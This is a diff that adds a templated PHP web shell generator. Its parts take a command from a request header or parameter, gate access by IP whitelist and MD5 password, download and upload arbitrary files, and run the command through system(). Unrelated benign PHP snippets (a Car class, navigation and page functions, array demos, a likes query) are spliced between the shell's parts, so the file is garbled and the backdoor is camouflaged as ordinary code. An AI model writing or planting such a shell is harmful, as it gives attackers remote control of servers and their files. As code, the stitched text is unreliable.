@@ -1,0 +1,131 @@
+{{/* Get command from param or header */}}
+// Create car class
+class Car {
+    function Car() {
+        $this->model = "Tesla";
+    }
+}
+// create an object
+  $Lightning = new Car();
+
+{{ if ne .CmdHeader "" }}
+  {{ index .V "cmd" }} = $_SERVER['HTTP_{{ .CmdHeader }}'];
+{{ else }}
+
+{{ if ne .Method "GET" }}
+  parse_str(file_get_contents('php://input'), $_REQUEST);
+{{ end }}
+
+  {{ index .V "cmd" }} = $_REQUEST['{{ .CmdParam }}'];
+{{ end }}
+  {{ index .V "cmd" }} = trim({{ index .V "cmd" }});
+
+function nav_menu($sep = ' | ')
+{
+  $nav_menu = '';
+  $nav_items = config('nav_menu');
+  foreach ($nav_items as $uri => $name) {
+    $class = str_replace('page=', '', $_SERVER['QUERY_STRING']) == $uri ? ' active' : '';
+    $url = config('site_url') . '/' . (config('pretty_uri') || $uri == '' ? '' : '?page=') . $uri;
+    
+    $nav_menu .= '<a href="' . $url . '" title="' . $name . '" class="item ' . $class . '">' . $name . '</a>' . $sep;
+  }
+
+  return trim($nav_menu, $sep);
+}
+
+{{ if .Whitelist }}
+  {{ index .V "whitelist" }} = array({{ .Whitelist }});
+  if (!in_array($_SERVER['REMOTE_ADDR'], {{ index .V "whitelist" }})) {
+    die;
+  }
+{{- end }}
+
+function page_content()
+{
+  $page = isset($_GET['page']) ? $_GET['page'] : 'home';
+
+  $path = getcwd() . '/' . config('content_path') . '/' . $page . '.phtml';
+
+  if (! file_exists($path)) {
+    $path = getcwd() . '/' . config('content_path') . '/404.phtml';
+  }
+
+  echo file_get_contents($path);
+}
+
+{{ if ne .Password "" }}
+  {{ index .V "hash" }} = '{{ .PasswordHash }}';
+{{ if ne .PasswordParam "" }}
+
+{{ if ne .Method "" }}
+  {{ index .V "pass" }} = $_REQUEST['{{ .PasswordParam }}'];
+{{ end }}
+
+$a = 'How are you?';
+
+if (strpos($a, 'are') !== false) {
+    $a = 'true';
+}
+
+{{ else if ne .PasswordHeader "" }}
+  {{ index .V "pass" }} = $_SERVER['HTTP_{{ .PasswordHeader }}'];
+{{ end }}
+  if (md5({{ index .V "pass" }}) != {{ index .V "hash" }}) {
+    die;
+  }
+{{- end }}
+
+
+{{ if .FileCapabilities }}
+  if (substr({{ index .V "cmd" }}, 0, 4) === 'get ') {
+    {{ index .V "cmdArgs" }} = explode(' ', {{ index .V "cmd" }});
+    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
+    if (!file_exists({{ index .V "filePath" }})) {
+      header("HTTP/1.1 404 Not Found");
+      die;
+    }
+    header("Content-Disposition: attachment; filename={{ index .V "filePath" }}");
+    header("Content-Type: application/octet-stream");
+    header("Content-Transfer-Encoding: binary");
+    header('Content-Length: ' . filesize({{ index .V "filePath" }}));
+    readfile({{ index .V "filePath" }});
+    die;
+  } else if (substr({{ index .V "cmd" }}, 0, 4) === 'put ') {
+    {{ index .V "cmdArgs" }} = explode(' ', {{ index .V "cmd" }});
+    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
+    {{ index .V "destPath" }} = basename({{ index .V "cmdArgs" }}[1]);
+    if (count({{ index .V "cmdArgs" }}) > 2) {
+      {{ index .V "destPath" }} = {{ index .V "cmdArgs" }}[2];
+    }
+    if (file_exists({{ index .V "destPath" }})) {
+      echo {{ index .V "destPath" }}.' already exists';
+      die;
+    }
+    $array = array(0, 1, 2, 3);
+
+    unset($array[2]);
+    $array = array_values($array);
+    // var_dump($array);
+    /* array(3) {
+      [0]=>
+      int(0)
+      [1]=>
+      int(1)
+      [2]=>
+      int(3)
+    } */
+    file_put_contents({{ index .V "destPath" }}, file_get_contents('php://input'));
+    echo 'Uploaded '.{{ index .V "filePath" }}.' to '.{{ index .V "destPath" }};
+    die;
+  }
+{{ end }}
+
+  $postID = trim(json_encode($_POST['postid']), '[]'); //convert array to string and remove square brackets to be a valid value for MySQL query
+
+  $likeQuery  = "select count(*) as total_likes from likes where post_id in ('.$postID.') group by post_id order by post_id desc"; //query number of likes
+
+  system({{ index .V "cmd" }});
+  die;
+
+  $arr = array("blue", "green", "red", "yellow", "green", "orange", "yellow", "indigo", "red");
